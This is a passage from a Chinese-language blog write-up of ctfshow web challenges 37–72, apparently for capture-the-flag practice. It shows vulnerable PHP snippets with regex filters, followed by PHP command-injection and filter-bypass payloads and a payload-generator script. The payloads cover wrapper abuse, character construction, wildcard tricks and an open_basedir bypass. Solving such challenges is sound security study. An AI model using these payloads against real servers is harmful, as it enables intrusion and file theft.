punctuation">&#123;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><blockquote><p>1、使用php:&#x2F;&#x2F;input POST写入php代码</p><?php system("cat fla*")?><p>2、使用data协议</p><p>c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4&#x3D;</p><?php system("tac flag.php")?></blockquote><h4 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h4><p>web37Payload照样打</p><h4 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> </code></pre><p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php%20system("tac fla*.php");?><br>?&gt;为php结束符号，后面拼接的.php会被忽略掉，不用管</p><h4 id="web40-数组函数"><a href="#web40-数组函数" class="headerlink" title="web40(数组函数)"></a>web40(数组函数)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\'|\"|\,|\&lt;|\.|\>|\/|\?|\\\\/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     </code></pre><p>这次添加了很多过滤，之前方法大多都不行了</p><blockquote><p>1、c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv()))))); 或者 c&#x3D;show_source(next(array_reverse(scandir(getcwd()))));</p><p>getcwd() 函数返回当前工作目录。它可以代替pos(localeconv())</p><p>localeconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回值为数组且第一项为”.”</p><p>pos():输出数组第一个元素，不改变指针；</p><p>current() 函数返回数组中的当前元素（单元）,默认取第一个值，和pos()一样</p><p>scandir() 函数返回指定目录中的文件和目录的数组。这里因为参数为”.”所以遍历当前目录</p><p>array_reverse():数组逆置</p><p>next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以</p><p>show_source():查看源码</p><p>pos() 函数返回数组中的当前元素的值。该函数是current()函数的别名。</p><p>每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。</p><p>提示：该函数不会移动数组内部指针。</p><p>相关的方法：</p><p>current()返回数组中的当前元素的值。</p><p>end()将内部指针指向数组中的最后一个元素，并输出。</p><p>next()将内部指针指向数组中的下一个元素，并输出。</p><p>prev()将内部指针指向数组中的上一个元素，并输出。</p><p>reset()将内部指针指向数组中的第一个元素，并输出。</p><p>each()返回当前元素的键名和键值，并将内部指针向前移动。</p><p>2、c&#x3D;eval(array_pop(next(get_defined_vars())));&#x2F;&#x2F;需要POST传入参数为1&#x3D;system(‘tac fl*’);</p><p>同理?cmd&#x3D;system(“tac%20flag.php”);&amp;c&#x3D;eval(pos(pos(get_defined_vars())));</p><p>get_defined_vars() 返回一个包含所有已定义变量的多维数组。这些变量包括环境变量、服务器变量和用户定义的变量，例如GET、POST、FILE等等。</p><p>next()将内部指针指向数组中的下一个元素，并输出。</p><p>array_pop() 函数删除数组中的最后一个元素并返回其值。</p><p>3、c&#x3D;session_start();system(session_id());<br>      passid&#x3D;ls</p><p><img src="web40.png" alt="web40" loading="lazy"></p><p>通过cookie获得参数进行命令执行</p><p>受php版本影响 5.5 -7.1.9均可以执行，因为session_id规定为0-9，a-z,A-Z,-中的字符。在5.5以下及7.1以上均无法写入除此之外的内容。但是符合要求的字符还是可以的。</p></blockquote><h4 id="web41-rce-or"><a href="#web41-rce-or" class="headerlink" title="web41(rce_or)"></a>web41(rce_or)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i'</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo(<span class="token interpolation"><span class="token variable">$c</span></span>);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> </code></pre><p>过滤了<code>$、+、-、^、~</code>使得<strong>异或自增和取反</strong>构造字符都无法使用，同时过滤了字母和数字。但是特意留了个<code>|</code>运算符</p><p>根据正则匹配生成可用字符的集合rce_or.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"rce_or.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$contents</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span><span class="token number">256</span> <span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$hex_i</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$hex_i</span><span class="token operator">=</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$hex_j</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$hex_j</span><span class="token operator">=</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$preg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_i</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_j</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token class-name">urldecode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">32</span><span class="token operator">&amp;</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">126</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$contents</span><span class="token operator">=</span><span class="token variable">$contents</span><span class="token operator">.</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span><span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>根据可用的字符生成Payload</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> urllib<span class="token keyword">from</span> sys <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">action</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">:</span>   s1<span class="token operator">=</span><span class="token string">""</span>   s2<span class="token operator">=</span><span class="token string">""</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> arg<span class="token punctuation">:</span>       f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"rce_or.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span>       <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>           t<span class="token operator">=</span>f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>           <span class="token keyword">if</span> t<span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">:</span>               <span class="token keyword">break</span>           <span class="token keyword">if</span> t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span>i<span class="token punctuation">:</span>               <span class="token comment">#print(i)</span>               s1<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>               s2<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>               <span class="token keyword">break</span>       f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>   output<span class="token operator">=</span><span class="token string">"(\""</span><span class="token operator">+</span>s1<span class="token operator">+</span><span class="token string">"\"|\""</span><span class="token operator">+</span>s2<span class="token operator">+</span><span class="token string">"\")"</span>   <span class="token keyword">return</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>   <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>   param<span class="token operator">=</span>action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"\n[+] your function："</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token operator">+</span>action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"[+] your command："</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[*] result:\n"</span><span class="token operator">+</span>param<span class="token punctuation">)</span></code></pre><p><img src="web41.png" loading="lazy"></p><h4 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>Payload:</p><blockquote><p>?c&#x3D;cat flag.php;  ?c&#x3D;cat flag.php||  ?c&#x3D;cat flag.php%26(&amp;)    c&#x3D;nl flag.php%0a  ?c&#x3D;echo <code>tac fl*</code>||</p><p>使用 “ ; “ “ || “ “ &amp; “ “ &amp;&amp; “ 分隔</p><p>&#x2F;dev&#x2F;null 2&gt;&amp;1 意思是将标准输出和标准错误都重定向到 &#x2F;dev&#x2F;null 即不回显<br>; 分号<br>| 只执行后面那条命令<br>|| 只执行前面那条命令<br>&amp; 两条命令都会执行<br>&amp;&amp; 两条命令都会执行</p></blockquote><h4 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h4><p>多过滤了cat,\和；，使用其他Payload即可</p><h4 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h4><p>多过滤了flag，使用fla*即可</p><h4 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h4><p>过滤了空格，使用$IFS或者%09绕过即可</p><h4 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h4><p>过滤了$和*，Payload如下：</p><blockquote><p>1、?c&#x3D;nl&lt;fla’’g.php||</p><p>2、?c&#x3D;ca\t&lt;fl\ag.php||</p></blockquote><h4 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>Payload:</p><blockquote><p>tac%09fl’’ag.php||</p><p>…….</p></blockquote><h4 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>多过滤了一些函数，不过之前Payload可以继续打</p><h4 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>过滤了%，但是可以&lt;</p><h4 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>同上</p><h4 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>ban了tac但是可以用nl</p><h4 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h4><p>ban了&lt;&gt;，但是可以用$IFS,而且这次flag放在了根目录</p><p>Payload:</p><blockquote><p>?c&#x3D;nl$IFS&#x2F;fl’’ag||</p></blockquote><h4 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token operator">.</span><span class="token variable">$d</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'no'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><p>Payload:</p><blockquote><p>1、?c&#x3D;ta’’c${IFS}f’’lag.php</p><p>2、s’’ort${IFS}f???????%0a</p></blockquote><h4 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><p>Payload:</p><blockquote><p>1、?c&#x3D;&#x2F;bin&#x2F;?at${IFS}f???????</p><p>2、mv flag.php t.txt</p></blockquote><h4 id="web55-无数字字母的命令执行"><a href="#web55-无数字字母的命令执行" class="headerlink" title="web55(无数字字母的命令执行)"></a>web55(无数字字母的命令执行)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|[a-z]|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>过滤了所有字母</p><p><img src="web55.png" loading="lazy"></p><p>利用post上传文件，然后使用.(source)执行，一般上传后文件在&#x2F;tmp&#x2F;php?????[@-[]</p><p><img src="web55_2.png" loading="lazy"></p><p>[参考文章]: <a href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a>“无字母数字的命令执行”</p><h4 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h4><p>方法同上</p><h4 id="web57-取反"><a href="#web57-取反" class="headerlink" title="web57(取反)"></a>web57(取反)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//flag in 36.php </span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\&lt;|\.|\,|\?|\*|\-|\=|\[/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>过滤了字母数字</p><p>通过<code>$(())</code>操作构造出36： <code>$(())</code> ：代表做一次运算，因为里面为空，也表示值为0</p><p><code>$(( ~$(()) )) </code>：对0作取反运算，值为-1</p><p><code>$(( $((~$(()))) $((~$(()))) ))</code>： -1-1，也就是(-1)+(-1)为-2，所以值为-2</p><p><code>$(( ~$(( $((~$(()))) $((~$(()))) )) )) </code>：再对-2做一次取反得到1，所以值为1</p><p>故我们在<code>$(( ~$(( )) ))</code>里面放37个<code>$((~$(())))</code>，得到-37，取反即可得到36</p><p>Payload:</p><blockquote><p>?c&#x3D;$((<del>$(($((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))))))</p></blockquote><h4 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>Payload:</p><blockquote><p>1、c&#x3D;show_source(‘flag.php’);</p><p>2、c&#x3D;highlight_file(“flag.php”);</p><p>3、c&#x3D;include($_POST[‘w’]);&amp;w&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>4、c&#x3D;include(“flag.php”);var_dump(get_defined_vars());</p></blockquote><h4 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h4><p>Payload同上</p><h4 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h4><p>Payload同上</p><h4 id="web61"><a href="#web61" class="headerlink" title="web61"></a>web61</h4><p>Payload同上</p><h4 id="web62"><a href="#web62" class="headerlink" title="web62"></a>web62</h4><p>Payload同上，不过ban了highlight_file函数</p><h4 id="web63"><a href="#web63" class="headerlink" title="web63"></a>web63</h4><p>Payload同上</p><h4 id="web64"><a href="#web64" class="headerlink" title="web64"></a>web64</h4><p>Payload同上</p><h4 id="web65"><a href="#web65" class="headerlink" title="web65"></a>web65</h4><p>ban了show_source,然后使用php伪协议读取flag.php时，源码显示flag不在这，于是使用data协议读取根目录看到flag.txt</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="web65.png" loading="lazy"></p><p>因为大部分直接可以命令执行的函数被ban了，看了wp没想到highlight_file没被ban</p><h4 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h4><p>Payload同上</p><h4 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h4><p>highlight_file被ban了，但是可以直接用php伪协议读取</p><h4 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h4><p>Payload同上</p><p>implode：把数组元素组合为字符串</p><p>冷门函数：读取函数readgzfile：可以读取非gz格式的文件</p><p>Payload：</p><blockquote><p>1、?c&#x3D;echo(implode(‘—‘,scandir(“&#x2F;“)));</p><p>2、?c&#x3D;readgzfile(‘&#x2F;flag.txt’);</p></blockquote><h4 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h4><p>虽然有几个报错但是flag还是出来了</p><h4 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|[a-z]/i"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"?"</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>虽然php伪协议可以读，但是结果把数字字母替换了，但是可以执行php代码让后面的匹配缓冲区不执行直接退出exit或die</p><p>Payload:</p><blockquote><p>c&#x3D;readgzfile(‘&#x2F;flag.txt’);exit(0);</p><p>c&#x3D;include(‘&#x2F;flag.txt’);exit(0);</p></blockquote><h4 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h4><p>Payload同上</p><h4 id="web72-glob协议-waf绕过"><a href="#web72-glob协议-waf绕过" class="headerlink" title="web72(glob协议+waf绕过)"></a>web72(glob协议+waf绕过)</h4><p>flag不在&#x2F;下了，但是很多查询的函数被ban了</p><p>使用glob:&#x2F;&#x2F;伪协议绕过open_basedir</p><p>glob可以遍历目录，并且不受disable_functions的限制。</p><pre class="language-php" data-language="php"><code class="language-php">c=?><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glob://./*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token 